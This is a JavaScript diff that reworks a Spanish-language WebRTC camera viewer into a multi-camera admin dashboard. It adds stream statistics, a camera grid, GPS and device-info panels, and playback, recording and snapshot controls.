+          const diff  = bytes - cameras[camId].prevBytes;
+          cameras[camId].prevBytes = bytes;
+          const kbps = Math.round((diff * 8) / 1024);
+          cameras[camId].stats.bit = kbps > 0 ? kbps + ' kbps' : '—';
+
+          const lost = r.packetsLost || 0;
+          const tot  = (r.packetsReceived || 0) + lost;
+          const lr   = tot > 0 ? ((lost/tot)*100).toFixed(1) : '0.0';
+          cameras[camId].stats.pkt = lr + '%';
+
+          if (r.frameWidth) cameras[camId].stats.res = `${r.frameWidth}×${r.frameHeight}`;
+          const q = parseFloat(lr)<1 && kbps>200 ? 'Excelente' : parseFloat(lr)<5 ? 'Buena' : 'Baja';
+          cameras[camId].stats.q = q;
+        }
+        if (r.type === 'candidate-pair' && r.state === 'succeeded') {
+          const rtt = r.currentRoundTripTime;
+          if (rtt !== undefined) {
+            const ms = Math.round(rtt * 1000);
+            cameras[camId].stats.lat = ms + ' ms';
+            // Update global latency display (first cam)
+            document.getElementById('ts-lat').textContent = ms + ' ms';
+          }
+        }
+      });
+    } catch(e) {}
+    updateCellStats(camId);
+    if (selectedId === camId) updateDetailStats();
+  }, 2000);
+}
+
+function stopCamStats(camId) {
+  if (cameras[camId] && cameras[camId].statsInterval) {
+    clearInterval(cameras[camId].statsInterval);
+    cameras[camId].statsInterval = null;
+  }
+}
+
+function startViewTimer(camId) {
+  stopViewTimer(camId);
+  cameras[camId].viewTimerInterval = setInterval(() => {
+    if (!cameras[camId]) return;
+    const sec = Math.floor((Date.now() - cameras[camId].viewerStartTime)/1000);
+    cameras[camId].stats.time = fmtTime(sec);
+    if (selectedId === camId) {
+      const el = document.getElementById('d-time');
+      if (el) el.textContent = cameras[camId].stats.time;
+    }
+  }, 1000);
+}
+function stopViewTimer(camId) {
+  if (cameras[camId] && cameras[camId].viewTimerInterval) {
+    clearInterval(cameras[camId].viewTimerInterval);
+    cameras[camId].viewTimerInterval = null;
+  }
+}
+
+// ── CAMERA LIST RENDER ─────────────────────
+function renderCamList() {
+  const list = document.getElementById('camList');
+  const ids  = Object.keys(cameras);
+  if (ids.length === 0) {
+    list.innerHTML = `<div style="font-family:'JetBrains Mono',monospace;font-size:.62rem;color:var(--text3);text-align:center;padding:20px 8px;">
+      Usá el escáner o añadí un código de cámara manualmente.
+    </div>`;
     return;
   }
-  document.getElementById('gpsWaiting').style.display = 'none';
-  document.getElementById('gpsCard').style.display = 'block';
+  list.innerHTML = '';
+  ids.forEach(id => {
+    const cam = cameras[id];
+    const isActive = selectedId === id;
+    const el = document.createElement('div');
+    el.className = 'cam-item' + (isActive ? ' active' : '');
+    el.id = `ci-${id}`;
 
-  document.getElementById('gps-lat').textContent  = d.lat  != null ? (+d.lat).toFixed(6)  : '—';
-  document.getElementById('gps-lng').textContent  = d.lng  != null ? (+d.lng).toFixed(6)  : '—';
-  document.getElementById('gps-acc').textContent  = d.acc  != null ? (+d.acc).toFixed(0)+'m' : '—';
-  document.getElementById('gps-alt').textContent  = d.alt  != null ? (+d.alt).toFixed(0)+'m' : '—';
-  document.getElementById('gps-spd').textContent  = d.spd  != null ? ((+d.spd)*3.6).toFixed(1)+' km/h' : '—';
-  document.getElementById('gps-head').textContent = d.head != null ? (+d.head).toFixed(0)+'°' : '—';
+    const dotClass = cam.status === 'live' ? 'live' : cam.status === 'connecting' ? 'connecting' : 'offline';
+    const statusText = cam.status === 'live' ? 'EN VIVO' : cam.status === 'connecting' ? 'Conectando…' : 'Desconectado';
 
-  if (d.lat != null && d.lng != null) {
-    const mapUrl = `https://www.google.com/maps?q=${d.lat},${d.lng}&z=17`;
-    document.getElementById('gpsMapLink').href = mapUrl;
-    // On-video overlay
-    vidGpsOverlay.style.display = 'block';
-    vidGpsOverlay.textContent = `📍 ${(+d.lat).toFixed(5)}, ${(+d.lng).toFixed(5)}  ±${d.acc != null ? (+d.acc).toFixed(0) : '?'}m`;
+    el.innerHTML = `
+      <div class="cam-item-header">
+        <div class="cam-dot ${dotClass}"></div>
+        <div class="cam-name">${cam.name}</div>
+        ${cam.status === 'live' ? '<div class="cam-badge-live">LIVE</div>' : ''}
+      </div>
+      <div class="cam-thumb">
+        ${cam.status === 'live'
+          ? `<video id="tvid-${id}" autoplay playsinline muted style="width:100%;height:100%;object-fit:cover;"></video>`
+          : `<div class="cam-thumb-overlay">${statusText}</div>`
+        }
+      </div>
+      <div class="cam-item-footer">
+        <div class="cam-footer-stat">ID: <span>${id}</span></div>
+        ${cam.gps ? `<div class="cam-footer-stat" style="margin-left:auto;color:var(--green)">📍 GPS</div>` : ''}
+      </div>
+    `;
+    el.addEventListener('click', () => selectCamera(id));
+    list.appendChild(el);
+
+    // Re-attach stream to thumb
+    if (cam.status === 'live' && cam.stream) {
+      const tv = document.getElementById(`tvid-${id}`);
+      if (tv) { tv.srcObject = cam.stream; tv.play().catch(()=>{}); }
+    }
+  });
+}
+
+// ── GRID RENDER ────────────────────────────
+function renderGrid() {
+  const grid      = document.getElementById('camGrid');
+  const emptyState= document.getElementById('emptyState');
+  const ids = Object.keys(cameras);
+
+  if (ids.length === 0) {
+    grid.style.display = 'none';
+    emptyState.style.display = 'flex';
+    return;
+  }
+  emptyState.style.display = 'none';
+  grid.style.display = 'grid';
+
+  // Rebuild all cells
+  grid.innerHTML = '';
+  ids.forEach(id => {
+    const cam = cameras[id];
+    const cell = document.createElement('div');
+    cell.className = 'cam-cell' + (selectedId === id ? ' selected' : '');
+    cell.id = `cell-${id}`;
+    cell.setAttribute('data-id', id);
+
+    if (cam.status === 'live') {
+      const gpsText = cam.gps ? `📍 ${(+cam.gps.lat).toFixed(5)}, ${(+cam.gps.lng).toFixed(5)} ±${cam.gps.acc != null ? (+cam.gps.acc).toFixed(0) : '?'}m` : '';
+      cell.innerHTML = `
+        <video id="gvid-${id}" autoplay playsinline style="width:100%;height:100%;object-fit:contain;filter:brightness(${cam.brightness||1})"></video>
+        <div class="cell-hud-top">
+          <div class="cell-live-badge">● LIVE</div>
+          <div class="cell-cam-name">${cam.name}</div>
+        </div>
+        <div class="cell-hud-bot">
+          <div>
+            ${gpsText ? `<div class="cell-gps-badge">${gpsText}</div>` : ''}
+            <div class="cell-stats-row" style="margin-top:3px">
+              <div class="cell-stat">${cam.stats.lat||'—'}</div>
+              <div class="cell-stat">${cam.stats.bit||'—'}</div>
+              <div class="cell-stat">${cam.stats.res||'—'}</div>
+            </div>
+          </div>
+          <div class="cell-actions">
+            <button class="cell-action-btn" onclick="snapCell('${id}',event)" title="Captura">
+              <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M23 19a2 2 0 01-2 2H3a2 2 0 01-2-2V8a2 2 0 012-2h4l2-3h6l2 3h4a2 2 0 012 2z"/><circle cx="12" cy="13" r="4"/></svg>
+            </button>
+            <button class="cell-action-btn" onclick="focusCell('${id}',event)" title="Focus">
+              <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M8 3H5a2 2 0 00-2 2v3m18 0V5a2 2 0 00-2-2h-3m0 18h3a2 2 0 002-2v-3M3 16v3a2 2 0 002 2h3"/></svg>
+            </button>
+            <button class="cell-action-btn" onclick="removeCam('${id}','Cámara desconectada');event.stopPropagation()" title="Desconectar" style="color:#ef4444">
+              <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><line x1="18" y1="6" x2="6" y2="18"/><line x1="6" y1="6" x2="18" y2="18"/></svg>
+            </button>
+          </div>
+        </div>
+      `;
+    } else if (cam.status === 'connecting') {
+      cell.innerHTML = `
+        <div class="cam-cell-overlay">
+          <div class="cell-connecting">
+            <div class="mini-spinner"></div>
+            <div class="mini-spinner-txt">Conectando ${id}…</div>
+          </div>
+        </div>
+      `;
+    } else {
+      cell.innerHTML = `
+        <div class="cam-cell-overlay">
+          <div class="mini-spinner-txt" style="color:var(--red)">Desconectado</div>
+          <div class="mini-spinner-txt">${id}</div>
+        </div>
+      `;
+    }
+
+    cell.addEventListener('click', (e) => {
+      if (!e.target.closest('.cell-action-btn')) selectCamera(id);
+    });
+    grid.appendChild(cell);
+
+    // Attach stream
+    if (cam.status === 'live' && cam.stream) {
+      const gv = document.getElementById(`gvid-${id}`);
+      if (gv) {
+        gv.srcObject = cam.stream;
+        gv.muted = cam.isMuted;
+        gv.volume = cam.volume !== undefined ? cam.volume : 1;
+        gv.play().catch(()=>{});
+      }
+    }
+  });
+
+  // Add empty filler cells if layout requires
+  if (currentLayout > 1 && currentLayout !== 'auto') {
+    const needed = currentLayout - ids.length;
+    for (let i = 0; i < needed; i++) {
+      const empty = document.createElement('div');
+      empty.className = 'cam-cell-empty';
+      empty.innerHTML = `<svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1"><path d="M15 10l4.553-2.069A1 1 0 0121 8.82v6.36a1 1 0 01-1.447.89L15 14M3 8a2 2 0 012-2h10a2 2 0 012 2v8a2 2 0 01-2 2H5a2 2 0 01-2-2V8z"/></svg>`;
+      grid.appendChild(empty);
+    }
   }
 }
 
-// ─── DEVICE INFO RECEIVER ───
-function handleDeviceInfo(d) {
-  document.getElementById('diWaiting').style.display = 'none';
-  document.getElementById('deviceInfoCard').style.display = 'block';
+function updateCellStats(camId) {
+  const cell = document.getElementById(`cell-${camId}`);
+  if (!cell || !cameras[camId] || cameras[camId].status !== 'live') return;
+  // Update stats chips without full re-render
+  const chips = cell.querySelectorAll('.cell-stat');
+  if (chips.length >= 3) {
+    chips[0].textContent = cameras[camId].stats.lat || '—';
+    chips[1].textContent = cameras[camId].stats.bit || '—';
+    chips[2].textContent = cameras[camId].stats.res || '—';
+  }
+}
+
+function updateCellGps(camId) {
+  const cell = document.getElementById(`cell-${camId}`);
+  if (!cell || !cameras[camId] || cameras[camId].status !== 'live') return;
+  const badge = cell.querySelector('.cell-gps-badge');
+  const gps = cameras[camId].gps;
+  if (gps && badge) {
+    badge.textContent = `📍 ${(+gps.lat).toFixed(5)}, ${(+gps.lng).toFixed(5)} ±${gps.acc != null ? (+gps.acc).toFixed(0) : '?'}m`;
+  } else if (gps && !badge) {
+    renderGrid(); // re-render to add GPS badge
+  }
+}
+
+// ── SELECTION ──────────────────────────────
+function selectCamera(id) {
+  selectedId = id;
+  // Update classes
+  document.querySelectorAll('.cam-item').forEach(el => el.classList.remove('active'));
+  document.querySelectorAll('.cam-cell').forEach(el => el.classList.remove('selected'));
+  const ci = document.getElementById(`ci-${id}`);
+  if (ci) ci.classList.add('active');
+  const cell = document.getElementById(`cell-${id}`);
+  if (cell) cell.classList.add('selected');
+
+  renderDetailPanel();
+}
+
+function renderDetailPanel() {
+  const cam = selectedId ? cameras[selectedId] : null;
+
+  // Detail section
+  if (cam && cam.status === 'live') {
+    document.getElementById('noSelectionMsg').style.display = 'none';
+    document.getElementById('detailContent').style.display = 'block';
+    document.getElementById('detail-name').textContent = cam.name;
+    document.getElementById('detail-id').textContent = 'ID: ' + cam.id;
+    updateDetailStats();
+    document.getElementById('controlsContent').style.display = 'none';
+    document.getElementById('controlsActive').style.display = 'block';
+    bindControls(selectedId);
+  } else {
+    document.getElementById('noSelectionMsg').style.display = 'block';
+    document.getElementById('detailContent').style.display = 'none';
+    document.getElementById('controlsContent').style.display = 'block';
+    document.getElementById('controlsContent').innerHTML = '<div class="no-selection">Sin cámara activa</div>';
+    document.getElementById('controlsActive').style.display = 'none';
+  }
+
+  renderGpsPanel();
+  renderDevicePanel();
+}
+
+function updateDetailStats() {
+  const cam = selectedId ? cameras[selectedId] : null;
+  if (!cam) return;
+  const s = cam.stats;
+  document.getElementById('d-lat').textContent = s.lat || '—';
+  document.getElementById('d-bit').textContent = s.bit || '—';
+  document.getElementById('d-pkt').textContent = s.pkt || '—';
+  document.getElementById('d-q').textContent   = s.q   || '—';
+  document.getElementById('d-res').textContent = s.res || '—';
+  document.getElementById('d-time').textContent = s.time || '—';
+  // Color quality
+  const qEl = document.getElementById('d-q');
+  qEl.className = 'info-card-val ' + (s.q==='Excelente' ? 'g' : s.q==='Buena' ? 'y' : '');
+}
+
+function renderGpsPanel() {
+  const cam = selectedId ? cameras[selectedId] : null;
+  const gps = cam ? cam.gps : null;
+  if (!gps) {
+    document.getElementById('gpsNoData').style.display = 'block';
+    document.getElementById('gpsCard').style.display = 'none';
+    document.getElementById('gpsMapBtn').style.display = 'none';
+    return;
+  }
+  document.getElementById('gpsNoData').style.display = 'none';
+  document.getElementById('gpsCard').style.display = 'block';
+  document.getElementById('gpsMapBtn').style.display = 'flex';
+  document.getElementById('g-lat').textContent  = gps.lat != null ? (+gps.lat).toFixed(6) : '—';
+  document.getElementById('g-lng').textContent  = gps.lng != null ? (+gps.lng).toFixed(6) : '—';
+  document.getElementById('g-acc').textContent  = gps.acc != null ? (+gps.acc).toFixed(0)+'m' : '—';
+  document.getElementById('g-alt').textContent  = gps.alt != null ? (+gps.alt).toFixed(0)+'m' : '—';
+  document.getElementById('g-spd').textContent  = gps.spd != null ? ((+gps.spd)*3.6).toFixed(1)+' km/h' : '—';
+  document.getElementById('g-head').textContent = gps.head != null ? (+gps.head).toFixed(0)+'°' : '—';
+  document.getElementById('gpsMapBtn').onclick = () => {
+    window.open(`https://www.google.com/maps?q=${gps.lat},${gps.lng}&z=17`, '_blank');
+  };
+}
+
+function renderDevicePanel() {
+  const cam = selectedId ? cameras[selectedId] : null;
+  const d   = cam ? cam.deviceInfo : null;
+  if (!d) {
+    document.getElementById('diWait').style.display = 'block';
+    document.getElementById('diCard').style.display = 'none';
+    return;
+  }
+  document.getElementById('diWait').style.display = 'none';
+  document.getElementById('diCard').style.display = 'block';
   const f = (id, val, cls) => {
-    const el = document.getElementById(id);
-    if (!el) return;
+    const el = document.getElementById(id); if(!el) return;
     el.textContent = val || '—';
     if (cls) el.className = 'di-val ' + cls;
   };
   f('di-platform', d.platform);
   f('di-browser',  d.browser);
-  f('di-engine',   d.engine);
   f('di-os',       d.os);
   f('di-screen',   d.screen);
-  f('di-dpr',      d.dpr);
-  f('di-mem',      d.memory ? d.memory + ' GB' : null);
-  f('di-cpu',      d.cores);
+  f('di-mem',      d.memory ? d.memory+' GB' : null);
+  f('di-cpu',      d.cores ? d.cores+' núcleos' : null);
   f('di-conn',     d.conn);
   f('di-lang',     d.lang);
   f('di-tz',       d.tz);
@@ -493,390 +1041,253 @@ function handleDeviceInfo(d) {
   f('di-online',   d.online ? 'Sí' : 'No', d.online ? 'g' : 'r');
 }
 
-// ─── DataChannel setup ───
-function setupDataChannel(dc) {
-  dataConn = dc;
-  dc.addEventListener('message', e => {
+// ── CONTROLS ───────────────────────────────
+function bindControls(camId) {
+  const cam = cameras[camId];
+  if (!cam) return;
+
+  // Mute
+  const muteBtn = document.getElementById('ctrl-mute');
+  muteBtn.onclick = () => {
+    cam.isMuted = !cam.isMuted;
+    const gv = document.getElementById(`gvid-${camId}`);
+    if (gv) gv.muted = cam.isMuted;
+    muteBtn.classList.toggle('act', cam.isMuted);
+    muteBtn.querySelector('svg').innerHTML = cam.isMuted
+      ? '<polygon points="11 5 6 9 2 9 2 15 6 15 11 19 11 5"/><line x1="23" y1="9" x2="17" y2="15"/><line x1="17" y1="9" x2="23" y2="15"/>'
+      : '<polygon points="11 5 6 9 2 9 2 15 6 15 11 19 11 5"/><path d="M15.54 8.46a5 5 0 010 7.07"/>';
+  };
+  muteBtn.classList.toggle('act', cam.isMuted);
+
+  // Fullscreen
+  document.getElementById('ctrl-fs').onclick = () => {
+    const cell = document.getElementById(`cell-${camId}`);
+    if (!cell) return;
+    if (!document.fullscreenElement) cell.requestFullscreen().catch(()=>{});
+    else document.exitFullscreen();
+  };
+
+  // PiP
+  document.getElementById('ctrl-pip').onclick = async () => {
+    const gv = document.getElementById(`gvid-${camId}`);
+    if (!gv) return;
     try {
-      const msg = JSON.parse(e.data);
-      if (msg.type === 'gps') handleGpsData(msg);
-      else if (msg.type === 'deviceInfo') handleDeviceInfo(msg);
-    } catch(err) {}
-  });
+      if (document.pictureInPictureElement) await document.exitPictureInPicture();
+      else await gv.requestPictureInPicture();
+    } catch(e) { toast('PiP no disponible','error'); }
+  };
+
+  // Snapshot
+  document.getElementById('ctrl-snap').onclick = () => snapCell(camId);
+
+  // Recording
+  const recBtn = document.getElementById('ctrl-rec');
+  recBtn.onclick = () => { cam.isRecording ? stopCamRec(camId) : startCamRec(camId); };
+  recBtn.classList.toggle('rec-active', cam.isRecording);
+  recBtn.innerHTML = cam.isRecording
+    ? `<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="3" y="3" width="18" height="18" rx="2" fill="currentColor"/></svg> Detener Grabación`
+    : `<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><circle cx="12" cy="12" r="8"/><circle cx="12" cy="12" r="3" fill="currentColor"/></svg> Iniciar Grabación`;
+
+  // Volume
+  const volSlider = document.getElementById('ctrl-vol');
+  const volVal    = document.getElementById('ctrl-vol-val');
+  volSlider.value = cam.volume !== undefined ? cam.volume : 1;
+  volVal.textContent = Math.round(volSlider.value * 100) + '%';
+  volSlider.oninput = () => {
+    cam.volume = parseFloat(volSlider.value);
+    volVal.textContent = Math.round(cam.volume * 100) + '%';
+    const gv = document.getElementById(`gvid-${camId}`);
+    if (gv) gv.volume = cam.volume;
+  };
+
+  // Brightness
+  const briSlider = document.getElementById('ctrl-bri');
+  const briVal    = document.getElementById('ctrl-bri-val');
+  briSlider.value = cam.brightness || 1;
+  briVal.textContent = (cam.brightness || 1).toFixed(2) + '×';
+  briSlider.oninput = () => {
+    cam.brightness = parseFloat(briSlider.value);
+    briVal.textContent = cam.brightness.toFixed(2) + '×';
+    const gv = document.getElementById(`gvid-${camId}`);
+    if (gv) gv.style.filter = `brightness(${cam.brightness})`;
+  };
+
+  // Disconnect
+  document.getElementById('ctrl-disconnect').onclick = () => {
+    removeCam(camId, `Cámara ${camId} desconectada`);
+  };
 }
 
-// ─── FIX 1: VIDEO HEALTH MONITOR (viewer side) ───
-// Detects frozen frames by checking if currentTime advances.
-// Also handles paused/stalled video by calling play().
-function startVideoHealthMonitor() {
-  clearInterval(videoHealthInterval);
-  let lastTime = -1;
-  let frozenCount = 0;
-
-  videoHealthInterval = setInterval(() => {
-    if (!remoteVideo.srcObject) return;
-
-    // Check if video is paused — force play
-    if (remoteVideo.paused && remoteVideo.srcObject && remoteVideo.readyState >= 2) {
-      remoteVideo.play().catch(() => {});
-    }
-
-    // Freeze detection: if currentTime hasn't changed for 2+ intervals AND video is live
-    if (remoteVideo.readyState >= 2 && !remoteVideo.paused) {
-      if (remoteVideo.currentTime === lastTime && lastTime > 0) {
-        frozenCount++;
-        if (frozenCount >= 2 && !freezeWarned) {
-          freezeWarned = true;
-          freezeBar.style.display = 'block';
-          // Try to kick the video element
-          const vol = remoteVideo.volume;
-          remoteVideo.srcObject = remoteVideo.srcObject; // re-assign same stream
-          remoteVideo.volume = vol;
-          remoteVideo.play().catch(() => {});
-        }
-      } else {
-        frozenCount = 0;
-        if (freezeWarned) {
-          freezeWarned = false;
-          freezeBar.style.display = 'none';
-        }
-      }
-    }
-    lastTime = remoteVideo.currentTime;
-  }, 2000);
-}
-
-// ─── PEER INIT ───
-function initPeer(cb) {
-  if (peer && !peer.destroyed) { if(cb) cb(); return; }
-  peer = new Peer({
-    config: {
-      iceServers: [
-        {urls:'stun:stun.l.google.com:19302'},
-        {urls:'stun:stun1.l.google.com:19302'},
-        {urls:'stun:global.stun.twilio.com:3478'},
-      ]
-    },
-    debug:0
-  });
-  peer.on('open', () => { if(cb) cb(); });
-  peer.on('error', err => {
-    if(err.type==='peer-unavailable') {
-      hideError();
-      showError('Código incorrecto o cámara no disponible.');
-      setStatus('ERROR', 'badge-err');
-      connectOverlay.style.display='flex';
-      loadingOverlay.style.display='none';
-      connectBtn.disabled=false;
-    } else {
-      showError('Error de red: '+err.message);
-    }
-  });
-}
-
-// ─── CALL ───
-async function doCall(camId) {
-  connectBtn.disabled = true;
-  loadingOverlay.style.display = 'flex';
-  loadingMsg.textContent = 'Iniciando conexión P2P...';
-  setStatus('LLAMANDO...', 'badge-call');
-  hideError();
-  ciCam.textContent = camId;
-
-  let emptyStream;
-  try {
-    const ac = new AudioContext();
-    const dest = ac.createMediaStreamDestination();
-    const aTrack = dest.stream.getAudioTracks()[0];
-    const canvas = document.createElement('canvas');
-    canvas.width = 2; canvas.height = 2;
-    const vTrack = canvas.captureStream(1).getVideoTracks()[0];
-    emptyStream = new MediaStream([aTrack, vTrack]);
-  } catch { emptyStream = new MediaStream(); }
-
-  loadingMsg.textContent = 'Conectando con la cámara...';
-
-  initPeer(() => {
-    // Open a DataChannel to the camera for receiving GPS + device info
-    const dc = peer.connect(camId, { reliable: true, label: 'data' });
-    dc.on('open', () => setupDataChannel(dc));
-    dc.on('data', e => {
-      // Some PeerJS versions fire 'data' directly
-      try {
-        const msg = JSON.parse(e);
-        if (msg.type === 'gps') handleGpsData(msg);
-        else if (msg.type === 'deviceInfo') handleDeviceInfo(msg);
-      } catch(err) {}
-    });
-
-    const call = peer.call(camId, emptyStream);
-    currentCall = call;
-    if (!call) {
-      showError('No se pudo iniciar la llamada.');
-      connectOverlay.style.display='flex';
-      loadingOverlay.style.display='none';
-      connectBtn.disabled=false;
-      return;
-    }
-
-    const timeout = setTimeout(() => {
-      if (!remoteVideo.srcObject || !remoteVideo.srcObject.active) {
-        call.close();
-        showError('Sin respuesta. Verificá que la cámara esté activa.');
-        connectOverlay.style.display='flex';
-        loadingOverlay.style.display='none';
-        setStatus('SIN RESPUESTA', 'badge-err');
-        connectBtn.disabled=false;
-      }
-    }, 15000);
-
-    call.on('stream', stream => {
-      clearTimeout(timeout);
-      remoteVideo.srcObject = stream;
-      remoteVideo.play().catch(() => {});
-      connectOverlay.style.display='none';
-      loadingOverlay.style.display='none';
-      reconnectOverlay.style.display='none';
-      liveBadge.style.display='block';
-      disconnectBtn.style.display='flex';
-      setStatus('EN VIVO', 'badge-live');
-      connectBtn.disabled=false;
-      hideError();
-      [recordBtn, screenshotBtn, recordBtnBot, screenshotBtnBot].forEach(b => b.disabled=false);
-      startViewTimer();
-      startStats(call);
-      startVideoHealthMonitor();   // FIX 1
-      ciNet.textContent = 'P2P Directo';
-      ciNet.style.color = 'var(--green)';
-    });
-
-    call.on('close', () => { clearTimeout(timeout); onDisconnected(); });
-    call.on('error',  () => { clearTimeout(timeout); onDisconnected(); });
-  });
-}
-
-function onDisconnected() {
-  liveBadge.style.display='none';
-  disconnectBtn.style.display='none';
-  stopRecording();
-  stopStats();
-  stopViewTimer();
-  clearInterval(videoHealthInterval);
-  freezeBar.style.display='none';
-  freezeWarned=false;
-  vidGpsOverlay.style.display='none';
-  [recordBtn, screenshotBtn, recordBtnBot, screenshotBtnBot].forEach(b => b.disabled=true);
-
-  if (targetCamId) {
-    remoteVideo.srcObject = null;
-    setStatus('RECONECTANDO', 'badge-call');
-    reconnectOverlay.style.display='flex';
-    clearTimeout(reconnectTimer);
-    reconnectTimer = setTimeout(() => {
-      if (!peer || peer.destroyed) { peer=null; initPeer(() => doCall(targetCamId)); }
-      else doCall(targetCamId);
-    }, 3000);
-  } else {
-    remoteVideo.srcObject=null;
-    connectOverlay.style.display='flex';
-    setStatus('DESCONECTADO', 'badge-idle');
-    showError('La cámara se desconectó.');
-    document.getElementById('diWaiting').style.display='block';
-    document.getElementById('deviceInfoCard').style.display='none';
-    document.getElementById('gpsWaiting').style.display='block';
-    document.getElementById('gpsCard').style.display='none';
-  }
-}
-
-// ─── STATS ───
-async function startStats(call) {
-  clearInterval(statsInterval);
-  const pc = call.peerConnection;
-  if (!pc) return;
-  statsInterval = setInterval(async () => {
-    try {
-      const reports = await pc.getStats();
-      reports.forEach(r => {
-        if (r.type === 'inbound-rtp' && r.kind === 'video') {
-          const bytes = r.bytesReceived || 0;
-          const diff  = bytes - prevBytesIn;
-          prevBytesIn = bytes;
-          const kbps  = Math.round((diff * 8) / 1024);
-          const bitStr = kbps > 0 ? kbps + ' kbps' : '—';
-          stBit.textContent = bitStr;
-          svBit.textContent = bitStr;
-          stBit.className = kbps > 500 ? 'stat-card-val g' : kbps > 100 ? 'stat-card-val y' : 'stat-card-val r';
-
-          const lost = r.packetsLost || 0;
-          const total = (r.packetsReceived || 0) + lost;
-          const lossRate = total > 0 ? ((lost/total)*100).toFixed(1) : '0.0';
-          stPkt.textContent = lossRate+'%';
-          svPkt.textContent = lossRate+'%';
-          stPkt.className = parseFloat(lossRate)<1 ? 'stat-card-val g' : parseFloat(lossRate)<5 ? 'stat-card-val y' : 'stat-card-val r';
-
-          if (r.frameWidth && r.frameHeight) stRes.textContent = `${r.frameWidth}×${r.frameHeight}`;
-          const q = parseFloat(lossRate)<1 && kbps>200 ? 'Excelente' : parseFloat(lossRate)<5 ? 'Buena' : 'Baja';
-          const qc = q==='Excelente' ? 'g' : q==='Buena' ? 'y' : 'r';
-          stQ.textContent=q; stQ.className='stat-card-val '+qc;
-          svQ.textContent=q; svQ.className='stat-val';
-        }
-        if (r.type==='candidate-pair' && r.state==='succeeded') {
-          const rtt = r.currentRoundTripTime;
-          if (rtt !== undefined) {
-            const ms = Math.round(rtt*1000);
-            stLat.textContent = ms+' ms';
-            svLat.textContent = ms+' ms';
-            stLat.className   = ms<80 ? 'stat-card-val g' : ms<200 ? 'stat-card-val y' : 'stat-card-val r';
-          }
-        }
-      });
-    } catch(e) {}
-    ciNet.textContent = navigator.onLine ? 'P2P Directo' : 'Sin red';
-    ciNet.style.color = navigator.onLine ? 'var(--green)' : 'var(--red)';
-  }, 2000);
-}
-function stopStats() { clearInterval(statsInterval); statsInterval=null; prevBytesIn=0; }
-
-// ─── VIEW TIMER ───
-function startViewTimer() {
-  viewStartTime = Date.now();
-  clearInterval(viewInterval);
-  viewInterval = setInterval(() => {
-    stTime.textContent = fmtTime(Math.floor((Date.now()-viewStartTime)/1000));
-  }, 1000);
-}
-function stopViewTimer() { clearInterval(viewInterval); viewInterval=null; }
-
-// ─── CONNECT ───
-connectBtn.addEventListener('click', () => {
-  const code = camIdInput.value.trim();
-  if (code.length !== 5) { showError('El código debe ser de 5 dígitos.'); return; }
-  targetCamId = code;
-  doCall(code);
-});
-
-// ─── DISCONNECT ───
-disconnectBtn.addEventListener('click', () => {
-  targetCamId = null;
-  clearTimeout(reconnectTimer);
-  if (currentCall) currentCall.close();
-  if (dataConn) { try { dataConn.close(); } catch(e) {} dataConn=null; }
-  onDisconnected();
-});
-
-// ─── MUTE ───
-muteBtn.addEventListener('click', () => {
-  isMuted = !isMuted;
-  remoteVideo.muted = isMuted;
-  muteBtn.classList.toggle('active-red', isMuted);
-  muteBtn.querySelector('svg').innerHTML = isMuted
-    ? '<polygon points="11 5 6 9 2 9 2 15 6 15 11 19 11 5"/><line x1="23" y1="9" x2="17" y2="15"/><line x1="17" y1="9" x2="23" y2="15"/>'
-    : '<polygon points="11 5 6 9 2 9 2 15 6 15 11 19 11 5"/><path d="M15.54 8.46a5 5 0 010 7.07"/>';
-});
-
-volumeSlider.addEventListener('input', () => {
-  const v = parseFloat(volumeSlider.value);
-  remoteVideo.volume = v;
-  volumeVal.textContent = Math.round(v*100)+'%';
-});
-
-brightnessSlider.addEventListener('input', () => {
-  const v = parseFloat(brightnessSlider.value);
-  brightnessVal.textContent = v.toFixed(2)+'×';
-  remoteVideo.style.filter = `brightness(${v})`;
-});
-
-fullscreenBtn.addEventListener('click', () => {
-  const el = remoteVideo.parentElement;
-  if (!document.fullscreenElement) (el.requestFullscreen||el.webkitRequestFullscreen).call(el);
-  else (document.exitFullscreen||document.webkitExitFullscreen).call(document);
-});
-document.addEventListener('fullscreenchange', () => {
-  fullscreenBtn.classList.toggle('active', !!document.fullscreenElement);
-});
-
-statsToggleBtn.addEventListener('click', () => {
-  statsHudOn = !statsHudOn;
-  vidStats.style.display = statsHudOn ? 'block' : 'none';
-  statsToggleBtn.classList.toggle('active', statsHudOn);
-});
-
-pipBtn.addEventListener('click', async () => {
-  try {
-    if (document.pictureInPictureElement) { await document.exitPictureInPicture(); pipBtn.classList.remove('active'); }
-    else if (remoteVideo.srcObject) { await remoteVideo.requestPictureInPicture(); pipBtn.classList.add('active'); }
-    else showError('Conectate a una cámara primero.');
-  } catch(e) { showError('PiP no disponible en este navegador.'); }
-});
-
-// ─── SCREENSHOT ───
-function takeScreenshot() {
-  if (!remoteVideo.srcObject) return;
+// ── SNAPSHOT ───────────────────────────────
+function snapCell(camId, event) {
+  if (event) event.stopPropagation();
+  const gv = document.getElementById(`gvid-${camId}`);
+  if (!gv) return;
   const canvas = document.createElement('canvas');
-  canvas.width  = remoteVideo.videoWidth  || 1280;
-  canvas.height = remoteVideo.videoHeight || 720;
-  canvas.getContext('2d').drawImage(remoteVideo, 0, 0);
+  canvas.width  = gv.videoWidth  || 1280;
+  canvas.height = gv.videoHeight || 720;
+  canvas.getContext('2d').drawImage(gv, 0, 0);
   const ts = new Date().toISOString().replace(/[:.]/g,'-').slice(0,-5);
   canvas.toBlob(blob => {
     const a = document.createElement('a');
     a.href = URL.createObjectURL(blob);
-    a.download = `streamlink-visor-cap-${ts}.png`;
+    a.download = `streamlink-admin-cap-${camId}-${ts}.png`;
     a.click();
     URL.revokeObjectURL(a.href);
   }, 'image/png');
-  const flash = document.createElement('div');
-  flash.style.cssText='position:absolute;inset:0;background:#fff;z-index:99;opacity:.7;pointer-events:none;transition:opacity .25s';
-  remoteVideo.parentElement.appendChild(flash);
-  setTimeout(()=>{flash.style.opacity='0';setTimeout(()=>flash.remove(),250)},50);
+  toast(`Captura guardada (Cam ${camId})`, 'success');
 }
-screenshotBtn.addEventListener('click', takeScreenshot);
-screenshotBtnBot.addEventListener('click', takeScreenshot);
 
